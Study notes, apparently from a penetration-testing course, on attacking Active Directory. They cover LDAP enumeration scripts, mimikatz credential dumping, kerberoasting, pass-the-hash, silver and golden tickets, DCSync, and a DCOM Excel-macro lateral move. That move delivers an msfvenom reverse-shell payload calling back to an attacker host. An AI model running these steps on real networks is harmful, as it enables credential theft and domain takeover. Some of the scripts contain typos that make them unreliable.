#AD is a service that allow sysads to update and manage OSs, applications, users, and data access on a large scale.  

# AD theory
Comprised of several compenents
- Domain Controller ( #DC) - Windows 200-2019 server with #ADDS role installed.  Contains all the password hashes of every single domain user account.
- #Domain - a created instance of a configured AD.  Can add various types of objects (computer and user objects)
- Organizational Units - comparable to file system folders, they are containers used to store and group other objects.
	- Computer objects - actual esrvers and workstations that are *domain-joined*
	- User objects - represent employees in the organization
	- Note : Some orgs will have machines that are **NOT** domain-joined ; esp. true for internet-facing machines
- AD has a very critical dependency on a #DNS service.  Therefore, a typical DC will also host an authoritative DNS server for a given domain.

# AD Enumeration
***Admin note : for the rest of this section, we'll assume that we've compromised a Windows workstation and compromised a user in the local admin group for a domain-joined workstation.*** 

In AD, admins use groups to assign perms to member users - therefore, *traget high-value groups* such as the *DomainAdmins* group.

## Enumerating Domain #users

### The traditional approach - net.exe 
- leverages the **net user** command (enumerates all *local* accounts)
- Adding the **/domain** flag enumerates all users in the domain (**net user /domain**) 
- Add the *username* to query a specific user (**net user jeff_admin /domain**)
- Enumerating Groups in the domain uses **net group /domain** 
	- *Nested* groups are groups (and all their included members) that can be added as members of another group

### The modern approach - #PowerShell
The PowerShell script we create will query the network for the name of the Primary DC emulator and the domain, search AD and filter the output to display user accounts, and then clean up the output for readability.
- relies on a *DirectorySearcher* object to query LDAP
- Our script will center around a very specific *LDAP provider path* that will serve as input to the *DirectorySearcher* .NET class
	- **LDAP://HostName[:PortNumber][/DistinguishedName]**
	- To create this path, we need the hostname and the DistinguishedName
1. Discover the hostname of the DC and the components of the DistinguishedName using a PowerShell command : `[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()` 
	1. this gives us the domain name from the *Name* property and the Primary DC name from the *PdcRoleOwner* property 
	`$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()`
	`$PDC = ($domainObj.PdcRoleOwner).Name`
	`$SearchString = "LDAP://"`
	`$SearchString += $PDC + "/"`
	`$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"`
	`$SearchString += $DistinguishedName`
	`$SearchString`
	2. this gives us the full LDAP provider path needed to perform #LDAP queries against the DC.
3. Instantiate the *DirectorySearcher* class with the LDAP provider path by specifying a *SearchRoot* (The notde in AD where searches start).  The following addtitions will be made to the above script.
	`$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)`
	`$objDomain = New-Object System.DirectoryServices.DirectoryEntry`
	`$Searcher.SearchRoot = $objDomain`
4. Now we'll set up filtering using the *samAccountType* attribute (present for all user, computer, and group objects).  For the current exaple, we'll supply 0x30000000 (decimal 805306368) to the filter property to enumerate all users in the domain.
	1. A resource for other filter properties is [Attribut SAM-Account-Type - Win32 apps | Microsoft Learn](https://learn.microsoft.com/fr-fr/windows/win32/adschema/a-samaccounttype?redirectedfrom=MSDN)
	`$Searcher.filter="samAccountType=805306368"`
	`$Searcher.FindAll()`
5. Clean up the STDOUT
	`Foreach($obj in $Result)`
	`{`
		`Foreach($prop in $obj.Properties)`
		`{`
			`$prop`
		`}`
		`Write-Host "-----------------------"`
	`}` 	
6. We can put any search properties in teh filter we want.  Completed Script : 
	`$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()`
	`$PDC = ($domainObj.PdcRoleOwner).Name`
	`$SearchString = "LDAP://"`
	`$SearchString += $PDC + "/"`
	`$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"`
	`$SearchString += $DistinguishedName`
	`$SearchString`
	`$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)`
	`$objDomain = New-Object System.DirectoryServices.DirectoryEntry`
	`$Searcher.SearchRot = $objDomain`
	`$Searcher.filter="samAccountType=805306368"`
	`$Result = $Searcher.FindAll()`
	`Foreach($obj in $Result)`
	`{`
		`Foreach($prop in $obj.Properties)`
		`{`
			`$prop`
		`}`
		`Write-Host "-----------------------"`
	`}` 	

### Resolving #nestedGroups
1. Locate all groups in the domain and print their names : create a filter for all records with an *objectClass* of "Group", and print the name property for each. 
	`$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()`
	`$PDC = ($domainObj.PdcRoleOwner).Name`
	`$SearchString = "LDAP://"`
	`$SearchString += $PDC + "/"`
	`$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"`
	`$SearchString += $DistinguishedName`
	`$SearchString`
	`$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)`
	`$objDomain = New-Object System.DirectoryServices.DirectoryEntry`
	`$Searcher.SearchRot = $objDomain`
	`$Searcher.filter="(objectClass=Group)"`
	`$Result = $Searcher.FindAll()`
	`Foreach($obj in $Result)`
	`{`
		`$obj.Properties.name`
	`}` 	
2. Listing members of a particular nested group by setting the appropriate filter in the name property
	`$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()`
	`$PDC = ($domainObj.PdcRoleOwner).Name`
	`$SearchString = "LDAP://"`
	`$SearchString += $PDC + "/"`
	`$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"`
	`$SearchString += $DistinguishedName`
	`$SearchString`
	`$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)`
	`$objDomain = New-Object System.DirectoryServices.DirectoryEntry`
	`$Searcher.SearchRot = $objDomain`
	`$Searcher.filter="(name=Secret_Group)"`
	`$Result = $Searcher.FindAll()`
	`Foreach($obj in $Result)`
	`{`
		`$obj.Properties.member`
	`}` 	
3. The output from the above script indicates a nested group, Nested_Group, is a member of Secret_Group.  To enumerate it's members, modify the filter : 
	`$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()`
	`$PDC = ($domainObj.PdcRoleOwner).Name`
	`$SearchString = "LDAP://"`
	`$SearchString += $PDC + "/"`
	`$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"`
	`$SearchString += $DistinguishedName`
	`$SearchString`
	`$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)`
	`$objDomain = New-Object System.DirectoryServices.DirectoryEntry`
	`$Searcher.SearchRot = $objDomain`
	`$Searcher.filter="(name=Nested_Group)"`
	`$Result = $Searcher.FindAll()`
	`Foreach($obj in $Result)`
	`{`
		`$obj.Properties.member`
	`}` 	

### Currently #logged-on users
Logged-in users that are members of high-value groups will have their #credentials cached in #memory, which could then be stolen and used !  When we work through pivoting compromised accounts throughout the AD, we must talior our enmueration to consider *Domain Admins* as well as potential avenues of *Chained compromise* (including a hunt for a *derivative local admin*)
- During an assessment, we should enumerate every computer in the domain, then use *NetWkstaUserEnum2* against the obtained list of targets. Windows API functions for this are :
	- #NetWkstaUserEnum - for all users logged onto a workstation requires admin perms 
	- #NetSessionEnum - can e used from a regular domain user and returns a list of active user sessions on servers such as fileservers or domain controllers.
- PowerView is a PowerShell script which is a part of the PowerShell Empire framework that facilitates this enumeration.
	- First, import the script on the window machine with **Import-Module .\PowerView.ps1**.  Then, we enumerate logged-in users with **Get-NetLoggedon** along with the **-ComputerName** option to psecify the target workstation or server.  We can invoke the **Get-NetSession -ComputerName** to invoke the *NetSessionEnum* 

### Enumeration through #SPN
Often, service accounts are also members of high value groups. Isolated applications can use a set of preefined service accounts : *LocalSystem*, *LocalService*, and *NetworkService*. 

When apps are integrated into AD, a unique service identifier ( #SPN) is used to sasociate a service on a specific server to a service account in the AD.  By enumerating the registered SPNs in a domain, we can obtain the IP address and port number of applications running on servers integrated with the target AD. Taking our script as an example : 

`$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()`
`$PDC = ($domainObj.PdcRoleOwner).Name`
`$SearchString = "LDAP://"`
`$SearchString += $PDC + "/"`
`$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"`
`$SearchString += $DistinguishedName`
`$SearchString`
`$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)`
`$objDomain = New-Object System.DirectoryServices.DirectoryEntry`
`$Searcher.SearchRot = $objDomain`
`$Searcher.filter="(serviceprincipalname=*http*)"`
`$Result = $Searcher.FindAll()`
`Foreach($obj in $Result)`
`{`
	`Foreach($prop in $obj.Properties)`
	`{`
		`$prop`	
	`}`
`}` 	

The common utilisation of the output of this script would be to look for Web Servers, which we can then turn around and further enumerate using **nslookup**. 

# AD Authentication

## #NTLM #Authentication
Used when a client authenticates to a server by IP Addy instead of by hostname, or if the userattempts to authenticate to a hostame that isn't registered on the AD integrated DNS server.  Seven Steps : ![[Pasted image 20221104142210.png]] 
1. Calculate the NTLM hash (Client) - calculated from the user's PW
2. Username (Client to app server)
3. Nonce (app server to client) - the *challenge* from the server
4. Response (Encrypted Nonce) (client to app server) -the client encrypts the nonce using the NTLM hash, now called the *response*, and sends it to server
5. Response, Username and nonce (app server to DC) 
6. Encrypt nonce w/ NTLM hash of user and compare to response (DC) - The DC knowns the NTLM has of ***ALL*** users
8. Approve Authentication (DC to app server)

## #kerberos Authentication
Kerberos is used as MSFTs primary authentication mechanism.  Kerberos authent to AD involves the use of a DC in the role of a Key Distribution Center (KDC). ![[Pasted image 20221104142933.png]] 
1. Authentication Server Request (Client to DC)
2. Authentication Server Reply (DC to Client)
3. #TGS_Req (Client to DC)
4. #TGS_Reply (DC to client)
5. Application Request (Client to App server)
6. Service Authentication (App server to Client)

To dive a bit more into the ticketing process : 
- When a user logs onto their workstation, a request is sent to the #KDC (Authentication Server Request, #AS_REQ). This contains a timestamp and is encrypted with a hash derived from the pw of the user and the username.
- DC looks up the user hash and attempts to decrypt the time stamp.  If successful and the time stamp isn't a duplicate (replay attack) authent is successful.
- KDC replies to the client with an *Authentication Server Reply ( #AS_REP*) containting a session key (encrypted w/ users pw hash) and a #TGT (info regarding the user). The TGT is encrypted by a secret key known only to KDC and cannot be decrypted by client.  TGT is valid for *10 hours* and the renewal is good for an hour (no re-entry of creds)
- When a user wants to access an app, client must contact the KDC with a *Ticket Granting Service Request ( #TGS_REQ)*. TGS_REQ contains user and timestamp, SPN of the resource, and encrypted TGT. 
- KDC receives the TGS_REQ and if the SPN exists the KDC decrypts the TGT. If the TGT has : 
	1. TGT with a valid timestamp (no replay or expired request)
	2. Username from TGS_REQ matching username from TGT
	3. Client IP must coincide with TGT IP.
- If all checks out, TGS_REP which contains
	1. #SPN to which access is granted
	2. session key between the client adn SPN
	3. Service Ticket ( #ST) containing username and group memberships and the newly-created session key.

## Cached credential storage and retrieval
As #Kerberos makes use of #SSO, pw hashes must be stored somewhere.  In current Windows versions, they are stored in LSASS (*Local Secuirty Authority Subsystem Service*) memory space.  We need SYSTEM or local admin perms to get to the hashes stored in LSASS. #mimikatz is a popular tool to extract these hashes targeting #LSASS.  
1. run **mimikatz.exe**
2. Enter **privilege::debug** to engage the *SeDebugPrivlege* (allows us to interact with a process owned by another account)
3. run **sekurlsa::logonpasswords** to dump the creds of all logged-on users using the Sekurlsa module.  Thi swill dump hashes for all users logged onto the current workstation or server, *including remote logins*. 
We can also leverage *mimikatz* to exploit Kerberos itself as TGTs and STs are also stored in LSASS.
- To show a users's tickets stored in memory, use the **sekurlsa::tickets** command.
- Stealing a TGS allows access only the resources associated with that TGS.  Stealing a TGT, however, allows us to request a TGS for any resource we want to taget in the domain.

## #serviceAccount attacks
This starts from the principle that *the ST is decrypted and validated by the application server, NOT the KDC*. From PowerShell, use the *KerberosRequestorSecurityToken* class to request the ST. Load the *System.IdentityModel* namespace using the *Add-Type* cmdlet with the *-AssemblyName* argument.  In the below example, note that 'HTTP/CorpWebServer.corp.com' is the #SPN that was identified using prior techniques.
- `Add-Type -AssemblyName System.IdentityModel`
   `New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'` 
- Can use the **klist** comand to display all cached in memory #Kerberos tickets for the currnet user in PowerShell.  To download the ST with mimikatz to save it to the disk, use the **kerberos::list** command with teh **/export** flag.
- Since the #ST is encrypted using the SPNs pw hash, we can try to decrypt it by brute force or guessing ( #kerberoasting).  Install the **kerberoast** package and run **tgsrepcrack.py**. (Or #JTR / #Hashcat) ![[Pasted image 20221107093920.png]] 

## Low and slow password guessing
Conducted using #LDAP and #ADSI against AD users without triggering an account lockout.  
1. Use the **net accounts** command to look at the domain's account policy

We can make queries in the context of a different user (previous examples performed queries against the DC as the *logged-in user*) by setting hte *DirectoryEntrance* instance.
	`$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()`
	`$PDC = ($domainObj.PdcRoleOwner).Name`
	`$SearchString = "LDAP://"`
	`$SearchString += $PDC + "/"`
	`$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"`
	`$SearchString += $DistinguishedName`
	`New-Object System.DirectoryServices.DirectoryEntry($SearchString, "jeff_admin", "Qwerty09!")`

# AD lateral movement

## Pass the hash
#PtH is a technique that allows us to authenticate to a system and gain code execution using only a user's hash or a Kerberos ticket instead of the associated plaintext pw.  Esentially, the mechanics are that the attacker connects to the victim using the #SMB protocol and authenticates using the #NTLM hash.  (This typically requires local admin rights). Tools that can perform this are : 
- #PsExec (Metasploit)
- Passing-the-hash toolkit
- #Impacket
This works for AD domain accounts and the built-in local admin account (***ONLY***, RID 500).

## #overpassTheHash
Goal is to gain a full kerberos TGT or ST.  To turn the NTLM hash into a kerberos ticket and avoid the use of NTLM authentication, use the **sekurlsa::pth** command in *mimikatz*. 
- must specify **/user** and **/domain:**, as well as the **/ntlm:** argument and the **/run:** argument to specify the process to create ![[Pasted image 20221107104705.png]]
- This gives us a new PS instance that allows us to execute commands as jeff_admin.  running **klist** here would show 0 tickets, as no resources have been called.  By running **net use \\dc01**, we'd generate a TGT.
- By converting the NTLM hash into a TGT, we can use any tools that rely on Kerberos authentication (PsExec).  You can do so by running **``.\PsExec.exe \\dc01 cmd.exe``** to run a command shell on the DC as the jeff_admin.

## Pass the ticket
Takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and used to authenticate to a specific service.  Added bonus is STs belonging to hte current user require no admin privs.

W/ the #serviceAccount pw or its associated NTLM hash, we can forge an ST to access the target resource with any perms we desire ( #silverTicket).  Mimikatz can craft a silver ticket and #inject it straight to memory through the **kerberos::golden** command (***note - this is not a golden ticket***)
1. First, get the #SID. [Identificateurs de sécurité - Win32 apps | Microsoft Learn](https://learn.microsoft.com/fr-fr/windows/win32/secauthz/security-identifiers?redirectedfrom=MSDN)
	- S (IDs the string as a SID)
	- R (Revision level, usually set to 1)
	- I (Identifier-authority value, often 5 within AD)
	- S (Subauthority values -- numeric identifier and relative identifier, RID
	![[Pasted image 20221107110024.png]]
	- Use the **whoami /user** command to get the domain SID portion
2. The #silverTicket command requires a username (**/user**), domain name (**/domain**), the domain SID (**/sid**), the fully qualified hostname of the service (**/target**), the service type (**/service:HTTP**), and the pw hash of the service account (**/rc4**).  Use the **/ptt** flag to direct the silver ticket directly into memory.  ![[Pasted image 20221107113253.png]]

## Distributed Component Object Model
Microsoft COM is a system for creating SW components that interact w/ eachother.  #DCOM is the extension for interaction between multiple computers over a network.  Interaction w/ DCOM is performed over *RPC* on #tcp/135 and requires local admin access to call the DCOM Service Control Manager.
- best leveraged against workstations as it requires microsoft office.

1. Discover the available methods or sub-objects for the #DCOM object w/ PS. Create the  instance using the *CreateInstance* method of the *System.Activator* class and discover its available methods and objects w/ *Get-Member* cmdlet.
	`$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application","192.168.1.110"))`
	`$com | Get-Member`
2. In this example, we're using excel to launch a VBA macro that launches **notepad.exe** ![[Pasted image 20221107115631.png]]
3. Copy the excel file to the remote computer - in this script you can use the *Copy* method of the .NET *System.IO.File* class, specifying the source file, destination file, and an overwrite flag.
	`$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"`
	`$RemotePath = "\\192.168.1.110\c$\myexcel.xls"`
	`[System.IO.File]::Copy($LocalPath, $RemotePath, $True)`
4. Call the *Open* method of the *Workbooks* object using the *$com* COM handle
	`$Workbook = $com.Workbooks.Open("C:\myexcel.xls")`
	1. This will result in an error b/c *Excel.Application* instantiated through DCOM is done with the SYSTEM account, which does not have a profile. By creating a Desktop directory at **``C:\Windows\SysWOW64\config\systemprofile\Desktop"``**
	`$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"`
	`$temp = [system.io.directory]::createDirector($Path)`
	Nw you can put it all together and call teh run method : 
	`$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application","192.168.1.110"))`
	`$com | Get-Member`
	`$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"`
	`$RemotePath = "\\192.168.1.110\c$\myexcel.xls"`
	`[System.IO.File]::Copy($LocalPath, $RemotePath, $True)`
	`$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"`
	`$temp = [system.io.directory]::createDirector($Path)`
	`$Workbook = $com.Workbooks.Open("C:\myexcel.xls")`
	`$com.Run("mymacro")`
4. This could should open notepad.exe in a high-integrity context ![[Pasted image 20221107134027.png]]
5. To run a #reverseShell, use the msfvenom payload for an #HTA attack developed earlier on : 
	**msfvenom -p windows/shel_reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f hta-psh -o evil.hta** 
	Then extract the code part of the file to add to the macro : ![[Pasted image 20221107134632.png]]![[Pasted image 20221107134702.png]] 
6. Start a nc listener, then execute the #macro !

# AD Persistence

## #goldenTickets
If we are able to get our hands on the #krbtgt password hash, we could create our own self-made custom TGTs, or *golden tickets* 
The #goldenTicket command requires a username - that can be fake (**/user**), domain name (**/domain**), the domain SID (**/sid**), and the pw hash of the krbtgt (**/krbtgt**).  Use the **/ptt** flag to direct the golden ticket directly into memory. ![[Pasted image 20221107135638.png]]

With the golden ticket in memory, you can again execute **psexec.exe \\dc01 cmd.exe**, and this time it will work. Verify it with **whoami** and **whoami /groups** 

## #DCSync Attack
Stealing the pw hashes for all administrative users in the domain by abusing AD functionality itself to capture hashes remotely from a workstation.

Most production environments have redundant DCs that use replication to sync. The DC receiving a request fo ran update does not verify that the request came from a known DC ; only htat the associated SID has appropriate privs. 
1. open up #mimikatz and use the **lsadump::dcsync** module with the **/user** option to indicate a target user to sync. **lsadump::dcsync /user:Administrator** 

